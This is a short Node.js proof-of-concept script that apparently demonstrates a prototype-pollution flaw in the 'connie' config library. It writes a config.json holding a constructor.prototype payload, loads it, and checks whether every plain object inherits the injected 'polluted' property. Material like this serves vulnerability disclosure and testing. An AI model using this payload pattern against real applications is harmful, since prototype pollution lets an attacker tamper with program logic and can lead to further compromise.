var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const connie = require('connie');
const fs = require('fs');
const path = require('path');
const pathToConfig = path.resolve(__dirname, './config.json');
fs.writeFileSync(pathToConfig, `{"constructor": {"prototype": {"polluted":"yes"}}}`);
connie('file', pathToConfig).read().then(() => {
    console.log({}.polluted);
    fs.unlinkSync(pathToConfig);
});